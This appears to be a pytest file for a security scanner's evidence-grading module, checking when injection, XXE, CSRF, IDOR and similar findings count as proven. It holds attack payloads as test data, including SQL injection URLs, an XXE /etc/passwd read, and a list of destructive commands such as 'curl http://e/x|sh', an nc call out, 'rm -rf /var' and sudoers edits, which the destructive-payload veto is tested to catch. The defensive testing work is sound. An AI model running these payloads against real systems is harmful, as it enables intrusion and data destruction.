    assert proof.grade("csrf", "new@evil.test",
                       [before, tokened, after]).grade != "proven"


def test_cache_pair_must_be_the_same_resource():
    """A reflected search term that also appears on another page graded cache
    poisoning."""
    search = ex("b27", "http://t.local/search?q=evil.attacker.test",
                "<p>Results for evil.attacker.test</p>")
    other = ex("b28", "http://t.local/sitemap",
               "<a href='http://evil.attacker.test'>x</a>")
    assert proof.grade("cache", "evil.attacker.test",
                       [search, other]).grade == "unproven"
    poisoner = ex("b29", "http://t.local/cached", "ok", 200,
                  req_headers={"x-forwarded-host": "evil.attacker.test"})
    victim = ex("b30", "http://t.local/cached",
                "<link href='http://evil.attacker.test/a.css'>")
    assert proof.grade("cache-poisoning", "evil.attacker.test",
                       [poisoner, victim]).grade == "proven"


def test_mass_assignment_and_prototype_pollution_have_their_own_classes():
    """Both were graded by verifiers that know nothing about fields."""
    assert proof.canonical("mass-assignment") == "massassign"
    assert proof.canonical("prototype-pollution") == "ppoll"
    # and ppoll is now provable from what its own probe collects
    pollute = ex("b31p", "http://t.local/api/config", '{"merged":true}', 200,
                 method="POST",
                 req_body='{"__proto__":{"argusmark1":"polluted"}}')
    read = ex("b31r", "http://t.local/api/config",
              '{"theme":"dark","argusmark1":"polluted"}')
    assert proof.grade("prototype-pollution", "argusmark1",
                       [pollute, read]).grade == "proven"
    write = ex("b31", "http://t.local/api/register", '{"id":9}', 200,
               method="POST", req_body='{"user":"x","is_admin":true}')
    read = ex("b32", "http://t.local/api/user/9",
              '{"id":9,"user":"x","is_admin":true}')
    assert proof.grade("massassign", '"is_admin":true',
                       [write, read]).grade == "proven"
    # citing only the write proves nothing: the quoted bytes are not in its
    # response, which is what the verbatim gate itself requires
    assert proof.grade("massassign", '"is_admin":true',
                       [write]).grade == "unproven"


def test_graphql_has_a_verifier_it_can_pass():
    """It was graded by the extraction verifier, which wants a FROM clause a
    GraphQL query never sends - so the class was unprovable."""
    q = ex("b33", "http://t.local/graphql",
           '{"data":{"__schema":{"types":[{"name":"User"}]}}}', 200,
           method="POST", req_body='{"query":"{__schema{types{name}}}"}')
    assert proof.grade("graphql", '"types":[', [q]).grade == "proven"


def test_upgrade_keeps_the_original_timestamp_and_the_new_metadata(tmp_path):
    """`ts` is when the finding was FIRST recorded and
    time_to_first_finding_s is computed from it; the upgrade rewrote it to the
    upgrade time and discarded the upgrading author's cvss and agent."""
    import time
    s = _sess(tmp_path)
    r1 = s.record_exchange("probe_sqli",
                           {"method": "GET", "url": "http://t.local/i?id=1'"},
                           {"status": 500, "headers": {},
                            "body": "sqlite3.OperationalError: near"})
    first = s.add_finding(
        "sqli", "high", "sqli", "http://t.local/i?id=1", [r1],
        "sqlite3.OperationalError", "d", "r", agent="exploit-1",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N")
    original_ts = first["ts"]
    time.sleep(0.01)
    r2 = s.record_exchange(
        "http_request",
        {"method": "GET", "url": "http://t.local/i?id=1' UNION SELECT a,b "
                                 "FROM users LIMIT 5-- -"},
        {"status": 200, "headers": {}, "body": "<li>admin - s3cr3t</li>"})
    up = s.add_finding(
        "sqli", "critical", "sqli", "http://t.local/i?id=1", [r1, r2],
        "admin - s3cr3t", "dumped", "bind", agent="exploit-2",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H")
    assert up["grade"] == "proven"
    assert up["ts"] == original_ts
    assert up["upgraded_ts"] > original_ts
    assert up["agent"] == "exploit-2"
    assert up["cvss"].endswith("C:H/I:H/A:H")


def test_upgrade_keeps_the_superseded_citation(tmp_path):
    """The upgrade replaced evidence_ids wholesale, so a second worker's
    better evidence erased the first worker's reference."""
    s = _sess(tmp_path)
    r1 = s.record_exchange("probe_cmdi",
                           {"method": "GET",
                            "url": "http://t.local/p?h=1;%20sleep%204"},
                           {"status": 200, "headers": {}, "body": "PING ok"})
    s.add_finding("cmdi", "high", "rce", "http://t.local/p", [r1],
                  "PING ok", "timing only", "r")
    r2 = s.record_exchange(
        "probe_cmdi",
        {"method": "GET",
         "url": "http://t.local/p?h=1;%20id;%20echo%20argus7k2m9x"},
        {"status": 200, "headers": {},
         "body": "uid=0(root) gid=0(root)\nargus7k2m9x"})
    up = s.add_finding("cmdi", "critical", "rce", "http://t.local/p", [r2],
                       "uid=0(root) gid=0(root)", "output", "argv")
    assert up["grade"] == "proven"
    assert r1 in up["superseded_evidence_ids"]


def test_auto_resolution_prefers_an_exchange_over_an_event(tmp_path):
    """The most recent match can be a scanner's output line, and citing that
    fails the wire check for every class - so a provable finding came back
    unproven because an external_result quoted the same bytes."""
    s = _sess(tmp_path)
    wire = s.record_exchange(
        "http_request",
        {"method": "GET", "url": "http://t.local/i?id=1' UNION SELECT a,b "
                                 "FROM users LIMIT 5-- -"},
        {"status": 200, "headers": {}, "body": "<li>admin - s3cr3t</li>"})
    event = s.record_event("external_result",
                           {"output": "sqlmap says: admin - s3cr3t"})
    f = s.add_finding("sqli", "high", "nosqli", "http://t.local/i", [],
                      "admin - s3cr3t", "d", "r")
    assert f["evidence_ids"] == [wire], f"cited {f['evidence_ids']}, not {wire}"
    assert event not in f["evidence_ids"]


def test_sarif_does_not_promote_an_unknown_grade_to_a_failure(tmp_path):
    """_KIND defaulted to "fail", so an ungraded legacy row - or a row whose
    grade was edited to something unrecognized - broke a CI build."""
    from argus.report.sarif import _KIND
    assert _KIND.get("candidate") == "review"
    assert _KIND.get("proven") == "fail"
    import inspect
    from argus.report import sarif
    src = inspect.getsource(sarif.render_sarif)
    assert '_KIND.get(grade, "review")' in src


# --- coverage, measured rather than assumed ---------------------------------

CANNOT_BE_PROVEN_HERE = {
    "xss": "no browser",
    "ssrf": "no collector",
    "enum": "one difference is not a counted series",
    "crlf": "the verifier compares bodies, not headers",
    "upload": "serving is not executing",
    "method": "a status difference is not an effect",
    "websocket": "no WebSocket client",
    "race": "no serial control is measured",
    "smuggle": "the desync pair is read as a difference",
    "dos": "refused by construction",
}


def test_every_class_either_has_a_proven_test_or_declares_it_cannot():
    """The honest coverage statement. A class with no positive test is either
    a gap or a cap, and the difference has to be written down - an auditor
    measured 12 classes with no `proven` assertion and could not tell which
    were which."""
    import pathlib
    import re
    src = pathlib.Path(__file__).read_text(encoding="utf-8")
    covered = set()
    for m in re.finditer(r'grade\(\s*["\']([a-z-]+)["\'][\s\S]{0,260}?=="?\s*'
                         r'"proven"', src):
        covered.add(proof.canonical(m.group(1)))
    for name in proof.classes():
        if name in covered:
            continue
        assert name in CANNOT_BE_PROVEN_HERE, \
            f"{name} has no test asserting `proven` and no declared reason"
        spec = proof.spec_for(name)
        assert spec.ceiling == "candidate" or spec.verifier is proof.verify_refused, \
            f"{name} is listed as unprovable here but its spec allows `proven`"


@pytest.mark.parametrize("name", sorted(n for n in CANNOT_BE_PROVEN_HERE
                                        if n != "dos"))
def test_a_capped_class_still_reaches_candidate_on_real_evidence(name):
    """A cap must not collapse to "never useful": the class still has to
    register a real difference as a candidate, which is what the report lists
    as work to finish."""
    if name in ("xss", "ppoll"):
        # a browser class needs its own shape: a raw metacharacter surviving
        # into an HTML response, which is the part that IS checkable here
        refl = ex("c3", "http://t.local/s?q=x%3C%3E%27%22",
                  "<html><body>Results for: x<>'\"</body></html>", 200,
                  headers={"content-type": "text/html; charset=utf-8"})
        v = proof.grade(name, "x<>'\"", [refl])
    else:
        a = ex("c1", "http://t.local/x?p=probe", "<html>baseline body</html>")
        b = ex("c2", "http://t.local/x?p=probe2", "<html>the difference</html>")
        v = proof.grade(name, "the difference", [a, b])
    assert v.grade == "candidate", f"{name} graded {v.grade}: {v.explain()}"
    assert v.requirement, name


def test_xxe_reads_a_file_through_the_parser():
    hit = ex("x1", "http://t.local/xml", "root:x:0:0:root:/root:/bin/bash",
             method="POST",
             req_body='<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]>'
                      '<r>&e;</r>')
    assert proof.grade("xxe", "root:x:0:0", [hit]).grade == "proven"
    # the entity declaration is what makes it this class
    plain = ex("x2", "http://t.local/xml", "root:x:0:0:root:/root:/bin/bash",
               method="POST", req_body="<r>hello</r>")
    assert proof.grade("xxe", "root:x:0:0", [plain]).grade == "unproven"


def test_the_capped_set_is_not_silently_growing():
    """If a class gains a real requirement its cap should come off, and if one
    is capped it must appear above. Either way the list is the statement."""
    capped = {n for n in proof.classes()
              if proof.spec_for(n).ceiling == "candidate"}
    refused = {n for n in proof.classes()
               if proof.spec_for(n).verifier is proof.verify_refused}
    assert capped | refused == set(CANNOT_BE_PROVEN_HERE), (
        f"capped/refused in code: {sorted(capped | refused)}, "
        f"declared here: {sorted(CANNOT_BE_PROVEN_HERE)}")


# --- the second audit, against a frozen tree --------------------------------
#
# The first audit ran while I was fixing, so its refuters mostly reported "the
# claim describes the parent commit". This set came from a tree that held
# still, and every case below graded `proven` or `candidate` on evidence with
# no vulnerability in it.

def test_an_echo_is_not_a_finding_in_any_class():
    """The precondition of every class, which I had implemented twice as a
    per-class detail. One search box echoing its query graded `sqli` and
    `nosqli` **proven**: send `SELECT a,b FROM users -- admin - s3cr3t` and
    quote `admin - s3cr3t` back out of the reflection."""
    import urllib.parse
    for cls, excerpt, payload in [
        ("sqli", "admin - s3cr3t",
         "We use PostgreSQL: SELECT a,b FROM users -- admin - s3cr3t"),
        ("nosqli", '{"user":"admin"}', '{"$ne":null} {"user":"admin"}'),
        ("lfi", "root:x:0:0", "../../etc/passwd root:x:0:0:root:/root"),
        ("xxe", "root:x:0:0",
         '<!ENTITY e SYSTEM "file:///etc/passwd"> root:x:0:0'),
        ("massassign", '"is_admin":true', '{"is_admin":true}'),
        ("disclosure", "SECRET_KEY=lab-secret-0123",
         "SECRET_KEY=lab-secret-0123"),
        ("rce", "uid=0(root) gid=0(root)",
         "; id argus1234 uid=0(root) gid=0(root)"),
    ]:
        e = ex("e1", "http://t.local/s?q=" + urllib.parse.quote_plus(payload),
               f"<html>Results for: {payload}</html>",
               method="POST", req_body=payload)
        v = proof.grade(cls, excerpt, [e])
        assert v.grade == "unproven", f"{cls} graded {v.grade}: {v.explain()}"
        assert "the target produced the quoted bytes" in v.missing, cls


def test_reflection_classes_are_exempt_from_the_echo_veto():
    """xss, prototype pollution and crlf are proven BY the reflection, so the
    veto must not apply to them - a universal rule written without the
    exemption would have deleted three classes."""
    # ppoll left this set: the server-side half - a property only the
    # polluting request sent, observed in a later read - is checkable, and
    # grading it by the browser verifier made the evidence its own probe
    # collects unusable
    for name in ("xss", "crlf"):
        assert proof.spec_for(name).reflection_is_the_finding, name
    refl = ex("e2", "http://t.local/s?q=x%3C%3E%27%22",
              "<html><body>Results for: x<>'\"</body></html>", 200,
              headers={"content-type": "text/html; charset=utf-8"})
    assert proof.grade("xss", "x<>'\"", [refl]).grade == "candidate"


def test_the_defence_working_is_not_a_finding():
    """The worst false positive there is. A write the app REFUSED graded csrf
    and massassign `proven`, and an expired session correctly refused graded
    jwt `proven` - the authorisation check working, reported as forgery."""
    before = ex("d1", "http://t.local/settings", "email: old@x.test")
    refused = ex("d2", "http://t.local/settings/update", "CSRF token missing",
                 403, method="POST", req_body="email=new@evil.test",
                 req_headers={"host": "t.local", "origin": "http://evil.test"})
    after = ex("d3", "http://t.local/settings", "email: new@evil.test")
    assert proof.grade("csrf", "new@evil.test",
                       [before, refused, after]).grade == "unproven"
    w = ex("d4", "http://t.local/api/register", "forbidden", 403,
           method="POST", req_body='{"is_admin":true}')
    r = ex("d5", "http://t.local/api/user/9", '{"id":9,"is_admin":true}')
    assert proof.grade("massassign", '"is_admin":true', [w, r]).grade == "unproven"
    ok = ex("d6", "http://t.local/api/me", '{"role":"admin"}', 200,
            req_headers={"host": "t.local", "cookie": "s=good"})
    expired = ex("d7", "http://t.local/api/me", "session expired", 401,
                 req_headers={"host": "t.local", "cookie": "s=old"})
    assert proof.grade("jwt", '{"role":"admin"}', [ok, expired]).grade == "unproven"


def test_a_refusal_is_not_data():
    """`nosqli` graded `proven` on `{"error":"invalid operator"}` and
    `graphql` on a 404 carrying "introspection is disabled"."""
    refused = ex("f1", "http://t.local/api/login",
                 '{"error":"invalid operator"}', 200, method="POST",
                 req_body='{"user":{"$ne":null}}')
    assert proof.grade("nosqli", '{"error":"invalid operator"}',
                       [refused]).grade == "unproven"
    declined = ex("f2", "http://t.local/graphql",
                  '{"errors":[{"message":"introspection is disabled"}]}', 404,
                  method="POST", req_body='{"query":"{__schema{types{name}}}"}')
    assert proof.grade("graphql", "introspection is disabled",
                       [declined]).grade == "unproven"


def test_the_host_is_part_of_the_endpoint():
    """Two tenants of a multi-tenant app, each reading their own record,
    compared as one endpoint and graded as broken access control."""
    a = ex("g1", "http://alice.saas.test/api/user/1", '{"username":"alice"}')
    b = ex("g2", "http://bob.saas.test/api/user/2", '{"username":"bob"}')
    assert proof._endpoint_shape(a) != proof._endpoint_shape(b)
    assert proof.grade("idor", '"username":"bob"', [a, b]).grade != "proven"


def test_idor_works_on_an_opaque_id_api():
    """Matching only integers made idor unprovable on every API that uses
    uuids, which is most of them."""
    u1 = ex("g3", "http://t.local/api/user/0b8c1f2e-1a2b-3c4d-5e6f-aabbccddeeff",
            '{"username":"me"}')
    u2 = ex("g4", "http://t.local/api/user/ffeeddcc-bbaa-9f8e-7d6c-112233445566",
            '{"username":"admin","email":"a@b.c"}')
    assert proof.grade("idor", '"username":"admin"', [u1, u2]).grade == "proven"


def test_a_capped_candidate_says_the_cap_held_it():
    """It reported every check green and `missing: []` while grading
    `candidate` - a reader could not tell short evidence from a capped class,
    and the two mean entirely different things."""
    a = ex("h1", "http://t.local/a", "<html>baseline</html>")
    b = ex("h2", "http://t.local/b", "<html>the difference</html>")
    v = proof.grade("ssrf", "the difference", [a, b])
    assert v.grade == "candidate"
    assert v.capped and "collector" in v.capped
    assert any("settled by this system" in m for m in v.missing)
    assert "capped_by_this_system" in v.to_dict()


def test_grading_is_bounded_in_the_number_of_cited_exchanges():
    """`_pairs` is O(N^2) and `_witness` runs the verifier on every candidate,
    so 200 cited exchanges was 40,000 verifier runs over full bodies."""
    ents = [ex(f"p{i}", f"http://t.local/p/{i}", f"page {i} body")
            for i in range(200)]
    v = proof.grade("idor", "page 7 body", ents)
    assert any("citation is small enough" in c["check"] for c in v.checks)
    assert len(proof._pairs(ents)) <= proof._MAX_PAIRED ** 2 + proof._MAX_PAIRED


@pytest.mark.parametrize("payload", [
    "cp /bin/sh /tmp/s; chmod u+s /tmp/s", "echo x >> /etc/sudoers",
    "ln -sf /etc/passwd /tmp/p", "truncate -s 0 /var/log/a",
    "setfacl -m u:x:rwx /etc", "pip install evil", "npm i -g evil",
    "docker run --rm -v /:/host alpine", "aws s3 cp s3://x /tmp",
    "php -r 'system(\"id\");'", "node -e 'x'", "/bin/busybox nc 1.2.3.4 9",
    "rm -rf /var", "curl http://e/x|sh", "powershell -enc AA",
    "reg add HKLM\\x", "net localgroup administrators x /add",
])
def test_the_veto_catches_a_destructive_payload(payload):
    """It exists so a demonstration whose proof is the damage cannot be
    recorded, and it missed 39 of 41 payloads an auditor tried."""
    assert proof.DESTRUCTIVE_RE.search(payload), payload
    e = ex("v1", "http://t.local/ping?host=1;%20" +
           payload.replace(" ", "%20") + ";%20id;%20echo%20argus1234",
           "uid=0(root) gid=0(root)\nargus1234")
    v = proof.grade("rce", "uid=0(root) gid=0(root)", [e])
    assert v.grade == "unproven"
    assert "proof command stayed benign" in v.missing


@pytest.mark.parametrize("value", [
    "?sort=name;category=books", "?filter=a&set=b",
    "Cookie: theme=dark; type=compact", "?note=see+the+type+below",
])
def test_an_ordinary_parameter_is_not_a_command(value):
    """`&set=b` and `; type=compact` satisfied rce's declaration check."""
    import urllib.parse
    assert not proof.COMMAND_SENT_RE.search(urllib.parse.unquote_plus(value))


@pytest.mark.parametrize("text,matches", [
    ("the marshal of the parade", False), ("a pickle recipe", False),
    ("yaml.load is unsafe", False), ("constructor[0]", False),
    ('!!python/object/apply:os.system ["id"]', True),
    ('O:8:"Evil":1:{', True), ("rO0ABXNy", True),
])
def test_serialized_payloads_are_not_english(text, matches):
    assert bool(proof.SERIALIZED_RE.search(text)) is matches, text


@pytest.mark.parametrize("html", ['<div role="navigation">', "<li role=menuitem>"])
def test_the_aria_role_attribute_is_not_a_subject_field(html):
    """`role=` matched every ARIA attribute, re-opening the pagination bypass
    on any HTML page."""
    assert not proof.SUBJECT_RE.search(html)
    assert not proof.PRIVILEGED_FIELD_RE.search(html)


def test_no_module_defines_a_function_twice():
    """A block rewrite left two `verify_generic` definitions in proof.py, the
    second silently shadowing the first. Nothing caught it: both happened to
    behave the same, and the next pair might not."""
    import ast
    import pathlib
    root = pathlib.Path(proof.__file__).resolve().parent
    offenders = {}
    for path in sorted(root.rglob("*.py")):
        tree = ast.parse(path.read_text(encoding="utf-8"))
        names = [n.name for n in tree.body
                 if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef,
                                   ast.ClassDef))]
        dups = sorted({n for n in names if names.count(n) > 1})
        if dups:
            offenders[path.name] = dups
    assert not offenders, f"shadowed top-level definitions: {offenders}"


def test_lockout_is_the_absence_of_a_difference():
    """It was graded by `_discriminates`, which asks for a difference - and
    this bug is characterised by not having one. The real bug graded
    `unproven` while the defence working graded `candidate`, and the
    `candidate` cap made the inversion look like a limit."""
    series = [ex(f"L{i}", "http://t.local/login", "Invalid credentials", 401,
                 method="POST", req_body="u=a&p=b") for i in range(6)]
    assert proof.grade("lockout", "Invalid credentials",
                       series).grade == "proven"
    throttled = series[:5] + [
        ex("L9", "http://t.local/login", "Too many attempts", 429,
           method="POST", req_body="u=a&p=b")]
    v = proof.grade("lockout", "Invalid credentials", throttled)
    assert v.grade == "candidate"
    assert "none of them was refused" in v.missing
    # two attempts is not a counted series
    assert proof.grade("lockout", "Invalid credentials",
                       series[:2]).grade == "unproven"
    assert proof.spec_for("lockout").ceiling == ""


def test_a_dangerous_scheme_in_location_is_off_origin():
    """`javascript:` has no host, so returning "" read it as in-origin and a
    redirect to `javascript:alert(1)` - which the lab plants and
    probe_redirect detects - graded `unproven`."""
    assert proof._redirect_host("javascript:alert(1)") == "javascript:"
    assert proof._redirect_host("data:text/html,x") == "data:"
    assert proof._redirect_host("/home") == ""
    js = ex("J1", "http://t.local/go?next=javascript:alert(1)", "", 302,
            headers={"location": "javascript:alert(1)"})
    home = ex("J2", "http://t.local/go?next=/home", "", 302,
              headers={"location": "/home"})
    assert proof.grade("redirect", "", [js, home]).grade == "proven"


def test_a_grade_stripped_with_its_proof_block_is_still_detected(tmp_path):
    """Deleting `grade` AND `proof` together looked exactly like a session
    recorded before grading existed. If any row in the file carries a grade,
    a row without one had it removed."""
    from argus.session import findings_overgraded
    s = _sess(tmp_path)
    rid = s.record_exchange("p", {"method": "GET", "url": "http://t.local/i"},
                            {"status": 500, "headers": {},
                             "body": "sqlite3.OperationalError: near"})
    a = s.add_finding("a", "high", "sqli", "http://t.local/i?id=1", [rid],
                      "sqlite3.OperationalError", "d", "r")
    b = s.add_finding("b", "low", "disclosure", "http://t.local/e", [rid],
                      "sqlite3.OperationalError", "d", "r")
    stripped = {k: v for k, v in a.items() if k not in ("grade", "proof")}
    rows = findings_overgraded({rid: s.get_exchange(rid)}, [stripped, b])
    assert rows and rows[0]["claimed"] == "(removed)"
    # a file with no grades anywhere is a legacy session, not a tampered one
    legacy = [{k: v for k, v in r.items() if k not in ("grade", "proof")}
              for r in (a, b)]
    assert findings_overgraded({rid: s.get_exchange(rid)}, legacy) == []


def test_sarif_never_defaults_an_unknown_grade_to_a_build_break():
    import inspect
    from argus.report import sarif
    src = inspect.getsource(sarif.render_sarif)
    assert '_KIND.get(grade, "review")' in src


# --- what the chain does and does not prove ---------------------------------

def test_an_unkeyed_chain_does_not_resist_forgery(tmp_path):
    """The honest property. sha256(prev + entry) is computable by anyone, so a
    self-consistent session can be built from nothing - the chain proves the
    file was not edited after the run, which is what tamper-EVIDENT means and
    all it means."""
    from argus.session import verify_transcript
    s = Session(tmp_path, "http://t.local", meta={})
    s.record_exchange("t", {"method": "GET", "url": "http://t.local/x"},
                      {"status": 200, "headers": {}, "body": "invented"})
    res = verify_transcript(s.dir)
    assert res["chained"] and not res["bad_lines"]


def test_a_keyed_chain_resists_it(tmp_path):
    """With a key the link is HMAC-SHA256, so only a holder of the key can
    produce a chain that verifies: the difference between "this file was not
    edited" and "this run happened"."""
    from argus.session import verify_transcript
    key = "engagement-key-2026"
    s = Session(tmp_path, "http://t.local", meta={"chain_keyed": True},
                seal_key=key)
    s.record_exchange("t", {"method": "GET", "url": "http://t.local/x"},
                      {"status": 200, "headers": {}, "body": "real"})
    assert not verify_transcript(s.dir, key)["bad_lines"]
    # without the key, verify says so instead of calling every line tampered
    unkeyed = verify_transcript(s.dir)
    assert unkeyed["key_required"] is True
    assert verify_transcript(s.dir, "wrong")["bad_lines"] == [1]


def test_the_seal_key_is_never_written_to_an_artifact(tmp_path):
    """An artifact carrying its own forging material would defeat the point."""
    import json
    key = "engagement-key-2026"
    s = Session(tmp_path, "http://t.local", meta={"chain_keyed": True},
                seal_key=key)
    s.record_exchange("t", {"method": "GET", "url": "http://t.local/x"},
                      {"status": 200, "headers": {}, "body": "real"})
    blob = "".join(p.read_text(encoding="utf-8", errors="replace")
                   for p in s.dir.iterdir())
    assert key not in blob
    meta = json.loads((s.dir / "meta.json").read_text(encoding="utf-8"))
    assert meta["chain_keyed"] is True and "seal_key" not in meta
